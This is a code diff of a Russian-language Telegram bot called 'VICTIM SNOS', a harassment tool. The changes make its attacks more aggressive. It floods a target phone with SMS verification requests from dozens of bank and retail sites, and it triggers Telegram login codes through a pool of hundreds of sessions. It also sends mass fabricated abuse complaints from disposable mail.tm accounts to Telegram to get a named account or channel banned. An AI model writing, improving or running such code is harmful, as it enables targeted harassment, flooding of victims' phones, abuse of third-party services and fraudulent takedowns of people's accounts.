@@ -7,6 +7,8 @@ import json
 import time
 import aiohttp
 from datetime import datetime
+from io import BytesIO
+from PIL import Image, ImageDraw, ImageFont
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -14,7 +16,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.filters import Command, StateFilter
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, BufferedInputFile
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
@@ -29,13 +31,13 @@ ADMIN_ID = 7736817432
 ALLOWED_USERS = set()
 
 MAX_SESSIONS = 600
-BOMBER_DELAY = 300
-TG_ATTACK_DELAY = 300
+SESSION_DELAY = 30
+BOMBER_DELAY = 30
+TG_ATTACK_DELAY = 30
 
 USE_MAILTM = True
-MAILTM_ACCOUNTS_COUNT = 100
-
-BANNER_PATH = "banner.png"
+MAILTM_ACCOUNTS_COUNT = 50
+MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -46,7 +48,6 @@ dp = Dispatcher(storage=MemoryStorage())
 active_attacks = {}
 sessions_pool = []
 sessions_ready = False
-sessions_init_task = None
 
 class AttackState(StatesGroup):
     waiting_phone = State()
@@ -56,8 +57,10 @@ class BomberState(StatesGroup):
     waiting_phone = State()
     waiting_count = State()
 
-class ComplaintState(StatesGroup):
+class ComplaintAccountState(StatesGroup):
     waiting_username = State()
+
+class ComplaintChannelState(StatesGroup):
     waiting_channel = State()
 
 class AccessMiddleware:
@@ -93,7 +96,7 @@ USER_AGENTS = [
     'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
 ]
 
-# ---------- САЙТЫ С АВТОРИЗАЦИЕЙ ЧЕРЕЗ TELEGRAM ----------
+# ---------- САЙТЫ ----------
 TELEGRAM_AUTH_SITES = [
     "https://api.fragment.com/auth",
     "https://api.getgems.io/auth/telegram",
@@ -114,7 +117,6 @@ TELEGRAM_AUTH_SITES = [
     "https://api.mexc.com/telegram-auth",
 ]
 
-# ---------- САЙТЫ ДЛЯ БОМБЕРА ----------
 BOMBER_WEBSITES = [
     {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
     {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
@@ -139,8 +141,6 @@ BOMBER_WEBSITES = [
     {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.vtb.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.raiffeisen.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.gazprombank.ru/auth/send", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
@@ -174,7 +174,52 @@ BOMBER_WEBSITES = [
     {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
 ]
 
-# ---------- MAIL.TM (ИСПРАВЛЕННЫЙ) ----------
+RECEIVERS = [
+    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
+    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
+]
+
+# ---------- БАННЕР ----------
+def generate_banner() -> BytesIO:
+    img = Image.new('RGB', (800, 400), color=(10, 10, 20))
+    draw = ImageDraw.Draw(img)
+    
+    for i in range(400):
+        color = (10 + i//4, 10 + i//8, 30 + i//6)
+        draw.rectangle([(0, i), (800, i+1)], fill=color)
+    
+    draw.rectangle([(0, 50), (800, 80)], fill=(180, 0, 0))
+    draw.rectangle([(0, 320), (800, 350)], fill=(180, 0, 0))
+    
+    try:
+        font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 60)
+        font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 30)
+        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 20)
+    except:
+        font_large = ImageFont.load_default()
+        font_medium = ImageFont.load_default()
+        font_small = ImageFont.load_default()
+    
+    draw.text((400, 120), "VICTIM SNOS", fill=(255, 50, 50), font=font_large, anchor="mm")
+    draw.text((400, 190), "ULTIMATE DESTRUCTION TOOL", fill=(200, 200, 200), font=font_medium, anchor="mm")
+    draw.text((400, 240), "v4.0 | Pyrogram Sessions | Mail.TM", fill=(150, 150, 150), font=font_small, anchor="mm")
+    
+    features = ["Telegram Snos", "SMS Bomber", "Mass Complaints", "Mail.TM"]
+    y_pos = 280
+    for feat in features:
+        draw.text((400, y_pos), feat, fill=(180, 180, 180), font=font_small, anchor="mm")
+        y_pos += 25
+    
+    draw.text((400, 370), "[ ONLINE ] [ READY ]", fill=(0, 200, 0), font=font_small, anchor="mm")
+    draw.rectangle([(5, 5), (795, 395)], outline=(100, 0, 0), width=2)
+    
+    bio = BytesIO()
+    img.save(bio, format='PNG')
+    bio.seek(0)
+    return bio
+
+
+# ---------- MAIL.TM ----------
 class MailTM:
     def __init__(self):
         self.base_url = "https://api.mail.tm"
@@ -223,10 +268,7 @@ class MailTM:
                 if resp.status in [200, 201]:
                     account_info = await resp.json()
                     
-                    login_data = {
-                        "address": account_data["address"],
-                        "password": account_data["password"]
-                    }
+                    login_data = {"address": account_data["address"], "password": account_data["password"]}
                     
                     async with self.session.post(
                         f"{self.base_url}/token",
@@ -242,25 +284,22 @@ class MailTM:
                                 "id": account_info["id"]
                             }
         except Exception as e:
-            logger.error(f"Mail.tm ошибка создания: {e}")
+            logger.error(f"Mail.tm error: {e}")
         return None
     
     async def create_multiple_accounts(self, count: int) -> list:
         accounts = []
-        logger.info(f"Создание {count} mail.tm аккаунтов...")
+        logger.info(f"Creating {count} mail.tm accounts...")
         
         for i in range(count):
             account = await self.create_account()
             if account:
                 accounts.append(account)
                 logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
-            else:
-                logger.warning(f"Не удалось создать аккаунт {i+1}")
             await asyncio.sleep(1.5)
         
         self.accounts = accounts
         self.ready = True
-        logger.info(f"Создано {len(accounts)} mail.tm аккаунтов")
         return accounts
     
     async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
@@ -281,123 +320,89 @@ class MailTM:
                 json=email_data,
                 headers=headers
             ) as resp:
-                if resp.status in [200, 201, 202]:
-                    logger.info(f"Email отправлен: {account['email']} -> {to_email}")
-                    return True
-                else:
-                    logger.warning(f"Ошибка отправки: {resp.status}")
-                    return False
-        except Exception as e:
-            logger.error(f"Ошибка отправки email: {e}")
+                return resp.status in [200, 201, 202]
+        except:
             return False
 
-# ---------- ИНИЦИАЛИЗАЦИЯ СЕССИЙ ----------
+
+# ---------- СЕССИИ PYROGRAM ----------
 async def init_single_session(session_index: int) -> dict:
-    """Инициализация одной сессии"""
     session_file = f"sessions/pool_{session_index}"
     try:
-        client = Client(
-            session_file, 
-            api_id=API_ID, 
-            api_hash=API_HASH, 
-            in_memory=False, 
-            no_updates=True
-        )
+        client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
         await client.connect()
-        return {"client": client, "in_use": False, "flood_until": 0, "index": session_index}
+        return {"client": client, "in_use": False, "flood_until": 0, "index": session_index, "last_used": 0}
     except Exception as e:
-        logger.error(f"Ошибка сессии {session_index}: {e}")
+        logger.error(f"Session {session_index} error: {e}")
         return None
 
-async def init_sessions_batch(start_idx: int, count: int) -> list:
-    """Инициализация пачки сессий"""
-    tasks = []
-    for i in range(start_idx, start_idx + count):
-        if i < MAX_SESSIONS:
-            tasks.append(init_single_session(i))
-    
-    results = await asyncio.gather(*tasks)
-    return [r for r in results if r is not None]
 
 async def init_sessions_background():
-    """Фоновая инициализация всех сессий"""
     global sessions_pool, sessions_ready
     
-    logger.info(f"Запуск инициализации {MAX_SESSIONS} сессий...")
-    
+    logger.info(f"Initializing {MAX_SESSIONS} sessions...")
     os.makedirs("sessions", exist_ok=True)
     
     batch_size = 50
     for batch_start in range(0, MAX_SESSIONS, batch_size):
-        batch_sessions = await init_sessions_batch(batch_start, batch_size)
-        sessions_pool.extend(batch_sessions)
-        logger.info(f"Загружено {len(sessions_pool)}/{MAX_SESSIONS} сессий")
+        tasks = [init_single_session(i) for i in range(batch_start, min(batch_start + batch_size, MAX_SESSIONS))]
+        results = await asyncio.gather(*tasks)
+        for r in results:
+            if r:
+                sessions_pool.append(r)
+        logger.info(f"Loaded {len(sessions_pool)}/{MAX_SESSIONS} sessions")
         await asyncio.sleep(1)
     
     sessions_ready = True
-    logger.info(f"Инициализация сессий завершена. Всего: {len(sessions_pool)}")
+    logger.info(f"Sessions ready: {len(sessions_pool)}")
 
-async def get_available_sessions(count: int) -> list:
-    """Получение доступных сессий"""
-    available = []
+
+async def get_available_session() -> dict:
     current_time = time.time()
+    available = []
     
     for session in sessions_pool:
         if not session["in_use"] and session["flood_until"] < current_time:
-            session["in_use"] = True
-            available.append(session)
-            if len(available) >= count:
-                break
+            if current_time - session["last_used"] >= SESSION_DELAY:
+                available.append(session)
     
-    return available
+    if available:
+        session = random.choice(available)
+        session["in_use"] = True
+        session["last_used"] = current_time
+        return session
+    return None
 
-def release_sessions(sessions: list):
-    """Освобождение сессий"""
-    for session in sessions:
+
+def release_session(session: dict):
+    if session:
         session["in_use"] = False
 
+
 # ---------- АТАКИ ----------
-async def send_tg_sms(phone: str, session: dict) -> dict:
-    """Отправка SMS через Telegram сессию"""
-    client = session["client"]
+async def send_tg_sms(phone: str) -> dict:
+    session = await get_available_session()
+    if not session:
+        return {"type": "SMS", "success": False, "error": "No available sessions"}
+    
     try:
+        client = session["client"]
         if not client.is_connected:
             await client.connect()
         await client.send_code(phone)
+        release_session(session)
         return {"type": "SMS", "success": True, "session": session["index"]}
     except FloodWait as e:
         session["flood_until"] = time.time() + e.value
+        release_session(session)
         return {"type": "SMS", "success": False, "flood": e.value, "session": session["index"]}
     except Exception as e:
-        return {"type": "SMS", "success": False, "error": str(e)[:30], "session": session["index"]}
+        release_session(session)
+        return {"type": "SMS", "success": False, "error": str(e)[:30]}
 
-async def send_tg_auth_request(session: aiohttp.ClientSession, phone: str, website: str) -> dict:
-    """Отправка запроса на сайт с авторизацией через Telegram"""
-    headers = {
-        'User-Agent': random.choice(USER_AGENTS),
-        'Content-Type': 'application/json',
-        'Accept': 'application/json',
-    }
-    
-    payload = {
-        'phone': phone,
-        'phone_number': phone,
-    }
-    
-    try:
-        async with session.post(website, headers=headers, json=payload, timeout=5, ssl=False) as resp:
-            return {"site": website.split('/')[2], "success": True, "status": resp.status}
-    except:
-        return {"site": website.split('/')[2], "success": False}
 
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, website: dict) -> dict:
-    """Отправка запроса на сайт бомбера"""
-    headers = {
-        'User-Agent': random.choice(USER_AGENTS),
-        'Content-Type': 'application/json',
-        'Accept': 'application/json',
-    }
-    
+    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
     payload = {website["phone_field"]: phone}
     
     try:
@@ -410,36 +415,44 @@ async def send_bomber_request(session: aiohttp.ClientSession, phone: str, websit
     except:
         return {"site": website["url"].split('/')[2], "success": False}
 
-async def tg_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
-    """Атака на Telegram авторизацию"""
+
+async def send_tg_auth_request(session: aiohttp.ClientSession, phone: str, website: str) -> dict:
+    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
+    payload = {'phone': phone, 'phone_number': phone}
+    
+    try:
+        async with session.post(website, headers=headers, json=payload, timeout=5, ssl=False) as resp:
+            return {"site": website.split('/')[2], "success": True}
+    except:
+        return {"site": website.split('/')[2], "success": False}
+
+
+async def combined_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
     results = []
     successful = 0
     failed = 0
     
-    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         for rnd in range(1, rounds + 1):
-            available = await get_available_sessions(min(100, len(sessions_pool)))
-            
-            if not available:
-                logger.warning("Нет доступных сессий")
-                await asyncio.sleep(5)
-                continue
-            
             tasks = []
             
-            # Запросы на сайты
-            for website in TELEGRAM_AUTH_SITES:
+            # Бомбер
+            for website in BOMBER_WEBSITES:
                 for _ in range(2):
+                    tasks.append(send_bomber_request(session, phone, website))
+            
+            # Telegram авторизация
+            for website in TELEGRAM_AUTH_SITES:
+                for _ in range(3):
                     tasks.append(send_tg_auth_request(session, phone, website))
             
-            # SMS через сессии
-            for sess in available:
-                tasks.append(send_tg_sms(phone, sess))
+            # SMS через сессии (до 50 за раунд)
+            for _ in range(min(50, len(sessions_pool))):
+                tasks.append(send_tg_sms(phone))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
-            release_sessions(available)
             
             for r in batch:
                 if isinstance(r, dict):
@@ -452,25 +465,27 @@ async def tg_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
             if progress_callback:
                 await progress_callback(rnd, rounds, successful, failed)
             
-            logger.info(f"TG раунд {rnd}/{rounds}: OK={successful} ERR={failed}")
-            await asyncio.sleep(TG_ATTACK_DELAY)
+            logger.info(f"Round {rnd}/{rounds}: OK={successful} ERR={failed}")
+            
+            if rnd < rounds:
+                await asyncio.sleep(BOMBER_DELAY)
     
     return results, successful, failed
 
-async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
-    """Бомбер атака"""
+
+async def bomber_only_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
     results = []
     successful = 0
     failed = 0
     
-    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         for rnd in range(1, rounds + 1):
             tasks = []
             
             for website in BOMBER_WEBSITES:
-                for _ in range(2):
+                for _ in range(3):
                     tasks.append(send_bomber_request(session, phone, website))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
@@ -486,96 +501,16 @@ async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tupl
             if progress_callback:
                 await progress_callback(rnd, rounds, successful, failed)
             
-            logger.info(f"Бомбер раунд {rnd}/{rounds}: OK={successful} ERR={failed}")
-            await asyncio.sleep(BOMBER_DELAY)
+            if rnd < rounds:
+                await asyncio.sleep(BOMBER_DELAY)
     
     return results, successful, failed
 
-# ---------- ОТЧЕТЫ ----------
-def generate_tg_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
-    lines = [
-        "VICTIM SNOS - ОТЧЕТ СНОСА TELEGRAM",
-        "=" * 50,
-        f"Пользователь: {username}",
-        f"Номер: {phone}",
-        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        f"Успешно: {successful}",
-        f"Ошибок: {failed}",
-        "=" * 50,
-        ""
-    ]
-    
-    # Статистика по сайтам
-    site_stats = {}
-    sms_success = 0
-    sms_failed = 0
-    
-    for r in results:
-        if r.get('type') == 'SMS':
-            if r.get('success'):
-                sms_success += 1
-            else:
-                sms_failed += 1
-        else:
-            site = r.get('site', 'Unknown')
-            if site not in site_stats:
-                site_stats[site] = {"ok": 0, "err": 0}
-            if r.get('success'):
-                site_stats[site]["ok"] += 1
-            else:
-                site_stats[site]["err"] += 1
-    
-    lines.append(f"SMS: OK={sms_success} ERR={sms_failed}")
-    lines.append("")
-    
-    for site, stats in site_stats.items():
-        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
-    
-    return "\n".join(lines)
 
-def generate_bomber_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
-    lines = [
-        "VICTIM SNOS - ОТЧЕТ БОМБЕРА",
-        "=" * 50,
-        f"Пользователь: {username}",
-        f"Номер: {phone}",
-        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        f"Сайтов: {len(BOMBER_WEBSITES)}",
-        f"Успешно: {successful}",
-        f"Ошибок: {failed}",
-        "=" * 50,
-        ""
-    ]
-    
-    site_stats = {}
-    for r in results:
-        site = r.get('site', 'Unknown')
-        if site not in site_stats:
-            site_stats[site] = {"ok": 0, "err": 0}
-        if r.get('success'):
-            site_stats[site]["ok"] += 1
-        else:
-            site_stats[site]["err"] += 1
-    
-    for site, stats in site_stats.items():
-        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
-    
-    return "\n".join(lines)
-
-# ---------- ЖАЛОБЫ (ИСПРАВЛЕННЫЕ) ----------
+# ---------- ЖАЛОБЫ ----------
 async def send_mass_complaint_account(mail_tm: MailTM, username: str) -> int:
-    """Отправка жалоб на аккаунт"""
-    if not mail_tm.ready or not mail_tm.accounts:
-        logger.error("Mail.tm не готов")
+    if not mail_tm.accounts:
         return 0
-    
-    receivers = [
-        'sms@telegram.org',
-        'dmca@telegram.org',
-        'abuse@telegram.org',
-        'support@telegram.org',
-        'security@telegram.org'
-    ]
     
     body = f"""Здравствуйте, поддержка Telegram!
 
@@ -600,28 +535,16 @@ async def send_mass_complaint_account(mail_tm: MailTM, username: str) -> int:
     
     tasks = []
     for account in mail_tm.accounts[:30]:
-        for receiver in receivers[:3]:
+        for receiver in RECEIVERS[:3]:
             tasks.append(send_one(account, receiver))
     
     results = await asyncio.gather(*tasks, return_exceptions=True)
-    sent = sum(1 for r in results if r is True)
-    
-    logger.info(f"Жалобы на аккаунт: отправлено {sent} писем")
-    return sent
+    return sum(1 for r in results if r is True)
+
 
 async def send_mass_complaint_channel(mail_tm: MailTM, channel: str) -> int:
-    """Отправка жалоб на канал"""
-    if not mail_tm.ready or not mail_tm.accounts:
-        logger.error("Mail.tm не готов")
+    if not mail_tm.accounts:
         return 0
-    
-    receivers = [
-        'sms@telegram.org',
-        'dmca@telegram.org',
-        'abuse@telegram.org',
-        'support@telegram.org',
-        'security@telegram.org'
-    ]
     
     body = f"""Здравствуйте, поддержка Telegram!
 
@@ -646,19 +569,57 @@ async def send_mass_complaint_channel(mail_tm: MailTM, channel: str) -> int:
     
     tasks = []
     for account in mail_tm.accounts[:30]:
-        for receiver in receivers[:3]:
+        for receiver in RECEIVERS[:3]:
             tasks.append(send_one(account, receiver))
     
     results = await asyncio.gather(*tasks, return_exceptions=True)
-    sent = sum(1 for r in results if r is True)
+    return sum(1 for r in results if r is True)
+
+
+# ---------- ОТЧЕТЫ ----------
+def generate_report(phone: str, results: list, successful: int, failed: int, attack_type: str) -> str:
+    lines = [
+        f"VICTIM SNOS - {attack_type} REPORT",
+        "=" * 50,
+        f"Phone: {phone}",
+        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        f"Success: {successful}",
+        f"Failed: {failed}",
+        "=" * 50,
+        ""
+    ]
     
-    logger.info(f"Жалобы на канал: отправлено {sent} писем")
-    return sent
+    site_stats = {}
+    sms_ok = sms_err = 0
+    
+    for r in results:
+        if r.get('type') == 'SMS':
+            if r.get('success'):
+                sms_ok += 1
+            else:
+                sms_err += 1
+        else:
+            site = r.get('site', 'Unknown')
+            if site not in site_stats:
+                site_stats[site] = {"ok": 0, "err": 0}
+            if r.get('success'):
+                site_stats[site]["ok"] += 1
+            else:
+                site_stats[site]["err"] += 1
+    
+    if sms_ok > 0 or sms_err > 0:
+        lines.append(f"SMS: OK={sms_ok} ERR={sms_err}")
+    
+    for site, stats in site_stats.items():
+        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
+    
+    return "\n".join(lines)
+
 
 # ---------- UI ----------
 def get_main_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="СНОС TELEGRAM", callback_data="tg_attack")
+    builder.button(text="КОМБО АТАКА", callback_data="combo_attack")
     builder.button(text="SMS БОМБЕР", callback_data="bomber_attack")
     builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="complaint_account")
     builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="complaint_channel")
@@ -667,108 +628,136 @@ def get_main_menu():
     builder.adjust(1)
     return builder.as_markup()
 
+
+async def send_banner_with_caption(message: types.Message, caption: str, reply_markup=None):
+    banner = generate_banner()
+    await message.answer_photo(
+        BufferedInputFile(banner.read(), filename="banner.png"),
+        caption=caption,
+        reply_markup=reply_markup
+    )
+
+
+async def edit_to_banner(callback: types.CallbackQuery, caption: str, reply_markup=None):
+    await callback.message.delete()
+    banner = generate_banner()
+    await callback.message.answer_photo(
+        BufferedInputFile(banner.read(), filename="banner.png"),
+        caption=caption,
+        reply_markup=reply_markup
+    )
+
+
 # ---------- ОБРАБОТЧИКИ ----------
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    status_text = "Готов" if sessions_ready else f"Загрузка ({len(sessions_pool)}/{MAX_SESSIONS})"
-    mail_status = "Готов" if (mail_tm.ready and mail_tm.accounts) else "Загрузка"
-    
     caption = (
-        "<b>VICTIM SNOS v3.0</b>\n\n"
-        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} ({status_text})\n"
-        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} ({mail_status})\n"
-        f"Сайтов TG: {len(TELEGRAM_AUTH_SITES)}\n"
-        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n\n"
+        "<b>VICTIM SNOS v4.0</b>\n\n"
+        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} {'[ГОТОВ]' if sessions_ready else '[ЗАГРУЗКА]'}\n"
+        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} {'[ГОТОВ]' if mail_tm.ready else '[ЗАГРУЗКА]'}\n"
+        f"Задержка SMS: {SESSION_DELAY} сек\n\n"
         "Выберите действие:"
     )
-    
-    if os.path.exists(BANNER_PATH):
-        await message.answer_photo(
-            FSInputFile(BANNER_PATH),
-            caption=caption,
-            reply_markup=get_main_menu()
-        )
-    else:
-        await message.answer(caption, reply_markup=get_main_menu())
+    await send_banner_with_caption(message, caption, get_main_menu())
+
 
 @dp.callback_query(F.data == "main_menu")
 async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
-    
-    status_text = "Готов" if sessions_ready else f"Загрузка ({len(sessions_pool)}/{MAX_SESSIONS})"
-    mail_status = "Готов" if (mail_tm.ready and mail_tm.accounts) else "Загрузка"
-    
     caption = (
         "<b>VICTIM SNOS - Главное меню</b>\n\n"
-        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} ({status_text})\n"
-        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} ({mail_status})"
+        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS}\n"
+        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}"
     )
-    
-    if os.path.exists(BANNER_PATH):
-        await callback.message.delete()
-        await callback.message.answer_photo(
-            FSInputFile(BANNER_PATH),
-            caption=caption,
-            reply_markup=get_main_menu()
-        )
-    else:
-        await callback.message.edit_text(caption, reply_markup=get_main_menu())
-    
+    await edit_to_banner(callback, caption, get_main_menu())
     await callback.answer()
+
 
 @dp.callback_query(F.data == "status")
 async def status(callback: types.CallbackQuery):
-    await callback.message.edit_text(
+    caption = (
         "<b>СТАТУС</b>\n\n"
         f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS}\n"
-        f"Готовность сессий: {'Да' if sessions_ready else 'Нет'}\n"
+        f"Готовность: {'Да' if sessions_ready else 'Нет'}\n"
         f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
-        f"Готовность почты: {'Да' if mail_tm.ready else 'Нет'}",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
-        ])
+        f"Готовность почты: {'Да' if mail_tm.ready else 'Нет'}\n"
+        f"Задержка SMS: {SESSION_DELAY} сек"
     )
+    await edit_to_banner(callback, caption, InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
+    ]))
     await callback.answer()
 
-@dp.callback_query(F.data == "tg_attack")
-async def tg_attack_start(callback: types.CallbackQuery, state: FSMContext):
-    if not sessions_ready or len(sessions_pool) == 0:
+
+@dp.callback_query(F.data == "combo_attack")
+async def combo_attack_start(callback: types.CallbackQuery, state: FSMContext):
+    if not sessions_ready:
         await callback.answer("Сессии еще загружаются!", show_alert=True)
         return
     
     await state.set_state(AttackState.waiting_phone)
     await callback.message.edit_text(
-        "<b>СНОС TELEGRAM</b>\n\n"
-        "Введите номер телефона:\n"
-        "Формат: +79001234567",
+        "<b>КОМБО АТАКА</b>\n\nВведите номер телефона:\nФормат: +79001234567",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
         ])
     )
     await callback.answer()
+
 
 @dp.callback_query(F.data == "bomber_attack")
 async def bomber_attack_start(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(BomberState.waiting_phone)
     await callback.message.edit_text(
-        f"<b>SMS БОМБЕР</b>\n\n"
-        f"Сайтов: {len(BOMBER_WEBSITES)}\n\n"
-        "Введите номер телефона:\n"
-        "Формат: +79001234567",
+        "<b>SMS БОМБЕР</b>\n\nВведите номер телефона:\nФормат: +79001234567",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
         ])
     )
     await callback.answer()
 
+
+@dp.callback_query(F.data == "complaint_account")
+async def complaint_account_start(callback: types.CallbackQuery, state: FSMContext):
+    if not mail_tm.ready:
+        await callback.answer("Почта еще загружается!", show_alert=True)
+        return
+    
+    await state.set_state(ComplaintAccountState.waiting_username)
+    await callback.message.edit_text(
+        "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
+        ])
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "complaint_channel")
+async def complaint_channel_start(callback: types.CallbackQuery, state: FSMContext):
+    if not mail_tm.ready:
+        await callback.answer("Почта еще загружается!", show_alert=True)
+        return
+    
+    await state.set_state(ComplaintChannelState.waiting_channel)
+    await callback.message.edit_text(
+        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
+        ])
+    )
+    await callback.answer()
+
+
 @dp.message(StateFilter(AttackState.waiting_phone))
-async def tg_process_phone(message: types.Message, state: FSMContext):
+async def combo_process_phone(message: types.Message, state: FSMContext):
     phone = message.text.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
         phone = "+" + phone
     await state.update_data(phone=phone)
     await state.set_state(AttackState.waiting_count)
     await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")
+
 
 @dp.message(StateFilter(BomberState.waiting_phone))
 async def bomber_process_phone(message: types.Message, state: FSMContext):
@@ -779,8 +768,9 @@ async def bomber_process_phone(message: types.Message, state: FSMContext):
     await state.set_state(BomberState.waiting_count)
     await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")
 
+
 @dp.message(StateFilter(AttackState.waiting_count))
-async def tg_process_count(message: types.Message, state: FSMContext):
+async def combo_process_count(message: types.Message, state: FSMContext):
     try:
         count = int(message.text.strip())
         if count < 1 or count > 5:
@@ -792,16 +782,15 @@ async def tg_process_count(message: types.Message, state: FSMContext):
     
     data = await state.get_data()
     phone = data["phone"]
-    username = f"{message.from_user.id}"
     
     await state.clear()
     
-    status_msg = await message.answer(f"<b>СНОС TELEGRAM ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}")
+    status_msg = await message.answer(f"<b>КОМБО АТАКА ЗАПУЩЕНА</b>\n\nНомер: {phone}\nРаундов: {count}")
     
     async def update_progress(current, total, successful, failed):
         try:
             await status_msg.edit_text(
-                f"<b>СНОС TELEGRAM</b>\n\n"
+                f"<b>КОМБО АТАКА</b>\n\n"
                 f"Номер: {phone}\n"
                 f"Раунд: {current}/{total}\n"
                 f"Успешно: {successful}\n"
@@ -810,18 +799,20 @@ async def tg_process_count(message: types.Message, state: FSMContext):
         except:
             pass
     
-    results, successful, failed = await tg_attack(phone, count, update_progress)
-    report = generate_tg_report(username, phone, results, successful, failed)
+    results, successful, failed = await combined_attack(phone, count, update_progress)
+    report = generate_report(phone, results, successful, failed, "COMBO")
     
-    filename = f"tg_snos_{phone.replace('+', '')}.txt"
+    filename = f"combo_{phone.replace('+', '')}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
         f.write(report)
     
     await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
     os.remove(filename)
-    
     await status_msg.delete()
-    await message.answer("<b>Главное меню</b>", reply_markup=get_main_menu())
+    
+    caption = "<b>Главное меню</b>"
+    await send_banner_with_caption(message, caption, get_main_menu())
+
 
 @dp.message(StateFilter(BomberState.waiting_count))
